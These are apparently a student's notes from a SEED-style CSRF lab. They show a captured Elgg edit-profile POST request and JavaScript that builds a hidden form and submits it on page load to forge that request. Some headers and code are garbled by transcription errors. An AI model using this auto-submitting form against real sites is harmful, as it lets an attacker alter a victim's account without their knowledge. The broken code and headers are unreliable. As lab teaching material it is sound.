## Attack on POST Request

Because where the data is attached in the POST vs GET, the POST service is slightly more difficult to exploit or create a forge request.

For this lab, we will modify someone's profile. If you go to the person's profile, you can hit the edit profile to modify your own profile. After you edit the profile, the save button that finalizes the edited profile, triggers a POST request.

When we launch the attack, we want to emulate the same profile editing process. The form filling and form submission process.
If you can do that inside the malicious Web page, this is pretty much the same thing you are doing in your own account.

## Edit-Profile POST Request.

We will do an investigation and look at what does the request look like. In this case, we will use the Live HTTP Header extension. What this does is if you send anything from the browser, it will be captured in the HTTP Header Live. That is how you can do an investigation and capture the request and then inspect what's inside.

For example:

http://wmm.seed-server.com/action/profile/edit <--- This is the URL. Clearly there's no data attached.

--------------------------------
Host: vmw.seed-server.com 
User-Agent: Hozilla/S.0 (X11; Ubuntu; Linux x86_64; ... 
Accept: text/htmLapplication/mhtmlvxml.application/xml; 
Accept•Language: en•USpen;q1.0.5 
Accept-Encoding: (pip, deflate 
Content-Type: nultipart/form-data; 
Content-Length: 3097 
Origin: http://morm.seed-server.com 
Connection: keep-alive 
Referer: http://www.seed-server.con/profile/charlie/edit 
Cookie: Ebig=6s7japncnbekdrtp9dhf6linqp <-- This is the session ID that is attached by the browser.
Upgrade-Insecure-Requests: 1 
---------------------------------
^ All this is the header ^

---------------------------------
elgg_token=ReCg3N)Xf3Qu22wcOolseQ <--- The first element is the countermeasures.
&__elgg_ts=1E2gO11111             <--- It is turned off so we can perform the attack.
&name:Charlie   <-- We are using Charlie's account.
&descriptionflaccesslevel(description)=2 
&briefdescription=Samy is my hero!  <-- A certin description field which you can edit.
&accesslevel[briefdescription]=2    <-- This is access level. In this case, number 2 puts this description field public.
& (many lines omitted) ... <-- There are other fields you can edit in the profile.
&guid:58       <-- Victim's ID. You need this so you can target specifically who's profile to edit.
---------------------------------
^ The important part is the Data ^

## Sending POST Requests

How do we launch this request? How do we trigger this request from the victim's machine? 
There are many different ways to trigger a POST request. But one of the most comon ways is to emualte this form filling and form submission process.

In this form:

<form action="http://www.example.com/action.Php" method="postft> 
  <label for="fname">First name:</label> 
  <input type="text"   id="fname" name="fname"><br><br> 
    
  <label for="lname">Last name:</label> 
  <input type="text" id="lname" name="lname"><br><br> 
  
  <input type="submit" value="Submit"> 
</form> 


First name: ___    <-- What ever you put here will be put inside the data part. That's how the form submission works
Last name:  ___    <--

Submit 

## Forging POST Requests

In order to emulate this process, we need to dynamically construct a page. We are going to put the form inside our page and we're going to fill in the information dynamically. We will also make the form hidden so the user doesn't see it and we will trigger the submission automatically.

<script type="text/javascript"> 
function send_post() 
{ 
  var fields; 
  fields += "<input type='hidden' name='name' value='Bob Smith'>";  <-- Strings
  fields += "<input type='hidden' name='age' value='20'>";          <--
  
  var p = document.createElement("form"); 
  p.action = "http://www.example.com";  <-- Action set to send this form to the URL
  p.innerHTML = fields; <-- Puts the string inside the forms as a form of content.
  p.method = "post"; <-- The type of the form will be post
  
  document. body.appendChild(p); <-- You need this to append it to your webpage or else the action will not happen.
  p.submit(); <-- This will trigger the form of submission that will trigger the post request which will send it to the URL
} 
window.onload = function() { send post(); }  <-- After the page loads, this triggers to send the post.
</script> 

